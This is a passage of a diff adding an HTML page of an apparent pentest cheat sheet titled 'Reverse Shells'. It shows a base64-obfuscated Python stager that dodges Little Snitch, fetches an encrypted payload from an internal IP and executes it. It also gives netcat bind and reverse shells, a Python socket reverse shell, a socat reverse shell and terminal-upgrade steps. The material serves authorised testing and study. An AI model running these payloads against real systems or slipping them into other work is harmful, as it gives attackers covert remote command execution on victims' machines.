+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;import sys,base64,warnings;warnings.filterwarnings(&#39;ignore&#39;);exec(base64.b64decode(&#39;aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xOTIuMTY4LjEwMC4xNTo4MCc7dD0nL2FkbWluL2dldC5waHAnO3JlcT11cmxsaWIyLlJlcXVlc3Qoc2VydmVyK3QpOwpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsVUEpOwpyZXEuYWRkX2hlYWRlcignQ29va2llJywic2Vzc2lvbj1oZE44bEEyeURrR2lEOHNXV1lYSlR0bStKMTQ9Iik7CnByb3h5ID0gdXJsbGliMi5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKHByb3h5KTsKdXJsbGliMi5pbnN0YWxsX29wZW5lcihvKTsKYT11cmxsaWIyLnVybG9wZW4ocmVxKS5yZWFkKCk7CklWPWFbMDo0XTtkYXRhPWFbNDpdO2tleT1JVisnQXQmKDdneEA/TUYhandiU3M0SH5sLVhMUHJPQ3ppOkUnO1MsaixvdXQ9cmFuZ2UoMjU2KSwwLFtdCmZvciBpIGluIHJhbmdlKDI1Nik6CiAgICBqPShqK1NbaV0rb3JkKGtleVtpJWxlbihrZXkpXSkpJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQppPWo9MApmb3IgY2hhciBpbiBkYXRhOgogICAgaT0oaSsxKSUyNTYKICAgIGo9KGorU1tpXSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCiAgICBvdXQuYXBwZW5kKGNocihvcmQoY2hhcileU1soU1tpXStTW2pdKSUyNTZdKSkKZXhlYygnJy5qb2luKG91dCkp&#39;));&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/usr/bin/python<span class="w"> </span><span class="p">&amp;</span>
+</pre></div>
+</div>
+</section>
+<section id="bind">
+<h2>Bind<a class="headerlink" href="#bind" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">C2</span>     <span class="o">-&gt;</span> <span class="n">nc</span> <span class="mf">192.168.0.192</span> <span class="mi">4444</span>
+<span class="n">client</span> <span class="o">-&gt;</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">4444</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+</pre></div>
+</div>
+</section>
+<section id="reverse">
+<h2>Reverse<a class="headerlink" href="#reverse" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">client</span> <span class="o">-&gt;</span> <span class="n">nc</span> <span class="mf">192.168.0.192</span> <span class="mi">4444</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> 
+<span class="n">C2</span>     <span class="o">-&gt;</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">4444</span>
+</pre></div>
+</div>
+</section>
+<section id="socket-based-python-shell">
+<h2>Socket based python shell<a class="headerlink" href="#socket-based-python-shell" title="Permalink to this heading">#</a></h2>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,7331));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="mi">7331</span><span class="p">))</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">])</span>
+</pre></div>
+</div>
+</section>
+<section id="using-stty-options-to-upgrade-a-shell">
+<h2>Using stty options to upgrade a shell<a class="headerlink" href="#using-stty-options-to-upgrade-a-shell" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># In reverse shell</span>
+<span class="w">    </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<span class="w">    </span>Ctrl-Z
+<span class="c1"># In Kali</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$TERM</span>
+<span class="w">    </span>stty<span class="w"> </span>-a
+<span class="w">    </span>stty<span class="w"> </span>raw<span class="w"> </span>-echo
+<span class="w">    </span><span class="nb">fg</span>
+<span class="c1"># In reverse shell</span>
+<span class="w">    </span>reset
+<span class="w">    </span><span class="nb">export</span><span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span>bash
+<span class="w">    </span><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+<span class="w">    </span>stty<span class="w"> </span>rows<span class="w"> </span>&lt;num&gt;<span class="w"> </span>columns<span class="w"> </span>&lt;cols&gt;
+</pre></div>
+</div>
+<p>For the carriage return mishandling thing, just run your listener on a bash instead of zsh</p>
+</section>
+<section id="using-socat">
+<h2>Using socat<a class="headerlink" href="#using-socat" title="Permalink to this heading">#</a></h2>
+<p>Listener:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>socat<span class="w"> </span>file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span><span class="w"> </span>tcp-listen:4444
+</pre></div>
+</div>
+<p>Victim:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>socat<span class="w"> </span>exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane<span class="w"> </span>tcp:10.0.3.4:4444
+</pre></div>
+</div>
+</section>
+<section id="stty">
+<h2>STTY<a class="headerlink" href="#stty" title="Permalink to this heading">#</a></h2>
+<p>Options</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">a</span>     <span class="c1"># Display all current settings</span>
+<span class="o">-</span><span class="n">e</span>     <span class="c1"># Display all current settings BSD style </span>
+<span class="o">-</span><span class="n">g</span>     <span class="c1"># Display all current settings in restorable format </span>
+</pre></div>
+</div>
+</section>
+<section id="local-modes-lflags-line-discipline-flag">
+<h2>Local   Modes (lflags -&gt; line discipline flag)<a class="headerlink" href="#local-modes-lflags-line-discipline-flag" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span>   <span class="c1"># Echo or do not echo every character typed </span>
+</pre></div>
+</div>
+</section>
+<section id="combination-modes">
+<h2>Combination Modes<a class="headerlink" href="#combination-modes" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">raw</span>    <span class="c1"># no input or output processing is performed.</span>
+<span class="n">sane</span>   <span class="c1"># Resets all modes to reasonable values for interactive terminal use.</span>
+<span class="n">rows</span>   <span class="c1"># The terminal size is recorded as having number rows.</span>
+<span class="n">cols</span>   <span class="c1"># The terminal size is recorded as having number cols.</span>
+<span class="n">size</span>   <span class="c1"># The size of the terminal is printed as two numbers on a single line, first rows, then columns.</span>
+</pre></div>
+</div>
+</section>
+<section id="compatibility-modes-legacy-command-names-maintained-for-compatibility">
+<h2>Compatibility Modes (legacy command names, maintained for compatibility)<a class="headerlink" href="#compatibility-modes-legacy-command-names-maintained-for-compatibility" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cooked</span> <span class="c1"># same as sane </span>
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../stego/stego.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Steganography</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../server-hardening/server-hardening.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Server Hardening</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Reverse Shells</a><ul>
+<li><a class="reference internal" href="#bash">Bash</a></li>
+<li><a class="reference internal" href="#python">python</a></li>
+<li><a class="reference internal" href="#bind">Bind</a></li>
+<li><a class="reference internal" href="#reverse">Reverse</a></li>
+<li><a class="reference internal" href="#socket-based-python-shell">Socket based python shell</a></li>
+<li><a class="reference internal" href="#using-stty-options-to-upgrade-a-shell">Using stty options to upgrade a shell</a></li>
+<li><a class="reference internal" href="#using-socat">Using socat</a></li>
+<li><a class="reference internal" href="#stty">STTY</a></li>
+<li><a class="reference internal" href="#local-modes-lflags-line-discipline-flag">Local   Modes (lflags -&gt; line discipline flag)</a></li>
+<li><a class="reference internal" href="#combination-modes">Combination Modes</a></li>
+<li><a class="reference internal" href="#compatibility-modes-legacy-command-names-maintained-for-compatibility">Compatibility Modes (legacy command names, maintained for compatibility)</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
